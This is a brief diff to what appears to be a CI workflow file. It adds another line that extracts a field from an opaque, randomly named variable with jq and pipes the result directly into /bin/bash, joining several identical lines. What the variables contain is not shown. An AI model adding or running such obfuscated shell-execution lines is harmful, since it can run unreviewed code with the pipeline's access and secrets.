@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$dtm484" | jq -r .hqa96 | /bin/bash
           echo $k6 | jq -r .uhmyj11 | /bin/bash
           echo $yj91 | jq -r .bxyy4 | /bin/bash
+          echo $ddz86 | jq -r .cumo9 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
